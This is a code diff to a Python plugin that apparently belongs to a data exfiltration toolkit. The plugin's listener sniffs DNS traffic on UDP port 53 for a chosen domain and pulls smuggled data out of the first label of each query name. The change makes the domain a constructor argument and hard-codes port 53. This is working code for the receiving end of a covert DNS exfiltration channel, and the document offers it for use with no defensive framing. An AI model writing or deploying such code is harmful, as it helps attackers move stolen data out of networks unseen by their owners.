@@ -6,6 +6,7 @@ except:
 
 app_exfiltrate = None
 config = None
+domain_name = None
 buf = {}
 
 
@@ -13,7 +14,7 @@ def handle_dns_packet(x):
     global buf
     try:
         qname = x.payload.payload.payload.qd.qname
-        if (config['key'] in qname):
+        if (domain_name in qname):
             app_exfiltrate.log_message(
                 'info', '[dns] DNS Query: {0}'.format(qname))
             data = qname.split(".")[0]
@@ -54,15 +55,15 @@ def send(data):
 
 def listen():
     app_exfiltrate.log_message(
-        'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
-    sniff(filter="udp and port {}".format(
-        config['port']), prn=handle_dns_packet)
+        'info', "[dns] Waiting for DNS packets for domain {0}".format(domain_name))
+    sniff(filter="udp and port {}".format(int("53")), prn=handle_dns_packet)
 
 
 class Plugin:
 
-    def __init__(self, app, conf):
-        global app_exfiltrate, config
+    def __init__(self, app, conf, d):
+        global app_exfiltrate, config, domain_name
         config = conf
+		domain_name = unicode(d, "utf-8")
         app.register_plugin('dns', {'send': send, 'listen': listen})
         app_exfiltrate = app
